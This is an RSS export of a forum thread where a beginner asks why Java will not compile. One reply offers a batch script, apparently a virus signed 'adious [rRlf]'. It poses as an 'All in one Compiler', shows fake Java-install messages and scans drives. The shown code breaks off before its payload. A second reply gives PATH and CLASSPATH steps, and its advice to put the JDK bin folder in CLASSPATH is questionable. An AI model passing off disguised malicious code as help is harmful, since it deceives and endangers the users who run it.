channel.title: My java wont work on complier help!
channel.description: [u][b]help me plz i cant complie at all and i just dowloaded java[/b][/u]

item.title: My java wont work on complier help!
item.dc:creator: @masta_XY masta XY
item.description:
@masta_XY wrote:

use thisâ€¦

:: Bat.Bush :: By adious [rRlf] :: Finnished on 23/6/03 2:30:48.59a @echo off cls if %shit%==prick goto ci if %cs%==yes goto msg1 if %hl%==yes goto msg2 if %lp%==yes goto msg3 if %mad%==yes goto msg4 goto ci :msg1 echo --------------[All in one Compiler]---------------- echo. echo Press: echo [1] install CS package echo [2] exit setup echo. choice /c:12>nul if errorlevel 1 set done=1 goto ci :msg2 echo -------------[ Compile/Run]---------------- echo. echo press: echo [1] Compile echo [2] exit setup choice /c:12>nul if errorlevel 1 set done=1 goto ci :msg3 echo Installing Linkin Parkomewhere I belong echo ,........ pause goto ci :msg4 echo Installing Java, setting classpaths echo ,........ pause :ci cls cd >l.l find /c /i "a:\" l.l >nul if not errorlevel 1 set pat=a:\ find /c /i "b:\" l.l item.source: My java wont work on complier help!

item.title: My java wont work on complier help!
item.dc:creator: @jc22493 Jc22493
item.description:
@jc22493 wrote:

Setting up your Environmental Variables

Environmental variables are what allows you to run your server with Java, without it you would simple get â€˜The path is not yet specifiedâ€™ so this is an extremely important step. We will firstly open â€˜My Computerâ€™ and click â€˜View System Informationâ€™. As you do this, a small applet displaying several tabs, and you will select the one that says â€˜Advancedâ€™ and at the bottom, click â€˜Environmental Variablesâ€™. Now what youâ€™re going to do, is go to your â€˜Pathâ€™ and â€˜Classpathâ€™ variables and edit them.

In your Classpath variable, youâ€™re going to take everything currently inside it and edit it with your latest version of JDK, so right now it would be;

CLASSPATH=C:\Program Files\Java\jdk1.6.0_11\bin;%CLASSPATH%;

Though if a newer version comes out, you would change the â€˜jdk1.6.0_11â€™ to the newest version.

After you have done the Classpath variable, youâ€™re going to find the Path variable and add the code below inside it.

C:\Program Files\Java\jdk1.6.0_11\bin;

The same goes for Path, if you download a newer version of JDK then youâ€™re going to change the â€˜jdk1.6.0_11â€™ to your current version.

^ Taken directly from The Soulâ€™s tutorial on starting a server. ^

Read full topic
